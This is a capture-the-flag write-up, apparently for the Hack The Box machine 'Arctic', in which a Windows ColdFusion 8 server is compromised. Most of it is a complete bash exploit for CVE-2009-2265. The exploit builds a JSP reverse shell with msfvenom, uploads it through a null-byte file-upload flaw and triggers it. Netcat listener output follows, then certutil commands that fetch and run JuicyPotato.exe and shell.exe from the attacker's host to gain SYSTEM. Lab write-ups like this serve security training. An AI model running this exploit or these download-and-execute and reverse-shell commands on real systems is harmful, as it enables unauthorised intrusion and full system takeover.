
### Initial access
Port scan
```bash
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```
subdomain scan
dirscan
filescan
Access webserver on port 8500 and recon the web and found the app version in `http://10.129.42.155:8500/CFIDE/wizards/common/_authenticatewizarduser.cfm`
Using exploit to get access https://github.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265/blob/master/CVE-2009-2265


Modify the exploit
```bash
#!/bin/bash

# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE) Bash Version
# CVE: CVE-2009-2265
# Author: Corrected multipart boundary handling
# Description: Uploads a JSP reverse shell payload and executes it.

# Function: Display usage instructions
usage() {
    echo "Usage: $0 -l <LHOST> -p <LPORT> -r <RHOST> -q <RPORT>"
    echo ""
    echo "Arguments:"
    echo "  -l <LHOST>    Local attacker IP (e.g., 10.10.16.5)"
    echo "  -p <LPORT>    Local attacker port for listener (e.g., 9001)"
    echo "  -r <RHOST>    Remote target IP (e.g., 10.10.10.11)"
    echo "  -q <RPORT>    Remote target port (ColdFusion) (e.g., 8500)"
    echo ""
    echo "Example: $0 -l 10.10.16.5 -p 9001 -r 10.10.10.11 -q 8500"
    exit 1
}

# Parse command-line arguments
while getopts "l:p:r:q:" opt; do
    case $opt in
        l) LHOST="$OPTARG" ;;
        p) LPORT="$OPTARG" ;;
        r) RHOST="$OPTARG" ;;
        q) RPORT="$OPTARG" ;;
        *) usage ;;
    esac
done

# Validate required arguments
if [[ -z "$LHOST" || -z "$LPORT" || -z "$RHOST" || -z "$RPORT" ]]; then
    echo "[-] Missing required arguments."
    usage
fi

# Generate a random filename for the payload
FILENAME=$(uuidgen)

# Step 1: Generate JSP payload using msfvenom
echo "[+] Generating JSP reverse shell payload..."
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o "${FILENAME}.jsp" > /dev/null 2>&1

# Check if payload was created
if [[ ! -f "${FILENAME}.jsp" ]]; then
    echo "[-] Failed to generate payload. Exiting..."
    exit 1
fi
echo "[+] Payload saved as '${FILENAME}.jsp'."

# Step 2: Write Proper Multipart Form Data to a Temporary File
BOUNDARY="----WebKitFormBoundary$(uuidgen)"
TMP_MULTIPART_FILE=$(mktemp)

# Construct the multipart body properly
echo "--${BOUNDARY}" > ${TMP_MULTIPART_FILE}
echo "Content-Disposition: form-data; name=\"newfile\"; filename=\"${FILENAME}.txt\"" >> ${TMP_MULTIPART_FILE}
echo "Content-Type: text/plain" >> ${TMP_MULTIPART_FILE}
echo "" >> ${TMP_MULTIPART_FILE}
cat "${FILENAME}.jsp" >> ${TMP_MULTIPART_FILE}
echo "" >> ${TMP_MULTIPART_FILE}
echo "--${BOUNDARY}--" >> ${TMP_MULTIPART_FILE}

# Step 3: Upload the Payload
echo "[+] Uploading the payload to the target..."
RESPONSE=$(curl -s -X POST \
    -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
    --data-binary "@${TMP_MULTIPART_FILE}" \
    "http://${RHOST}:${RPORT}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/${FILENAME}.jsp%00")

# Check the response
if [[ -z "$RESPONSE" ]]; then
    echo "[-] No response received. Check your target connection."
    rm -f "${FILENAME}.jsp" "${TMP_MULTIPART_FILE}"
    exit 1
fi
echo "[+] Server response:"
echo "$RESPONSE"



# Step 5: Trigger the Payload
echo "[+] Attempting to trigger the payload..."
TRIGGER_URL="http://${RHOST}:${RPORT}/userfiles/file/${FILENAME}.jsp"
TRIGGER_RESPONSE=$(curl -s "$TRIGGER_URL")

if [[ -z "$TRIGGER_RESPONSE" ]]; then
    echo "[-] Failed to trigger the payload. Target may not have executed the payload."
else
    echo "[+] Payload triggered successfully. Check your listener for the reverse shell."
fi

# Step 6: Auto Cleanup
echo "[+] Cleaning up local files..."
rm -f "${FILENAME}.jsp" "${TMP_MULTIPART_FILE}"
echo "[+] Done!"
```

Get revshell
```bash
┌──(kali㉿kali)-[~/HTB/Arctic]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.42.155] 49410
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>


```
### Lateral Movement
### Priv escalation
```
C:\tmp>certutil -urlcache -split -f http://10.10.17.47/JuicyPotato.exe C:\tmp\JuicyPotato.exe && C:\tmp\JuicyPotato.exe
C:\tmp>certutil -urlcache -split -f http://10.10.17.47/shell.exe C:\tmp\shell.exe && C:\tmp\shell.exe
C:\tmp>JuicyPotato.exe -t * -p C:\tmp\shell.exe -l 1337


```
We get system priv
```bash
┌──(kali㉿kali)-[~/HTB/Arctic]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.42.155] 49573
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```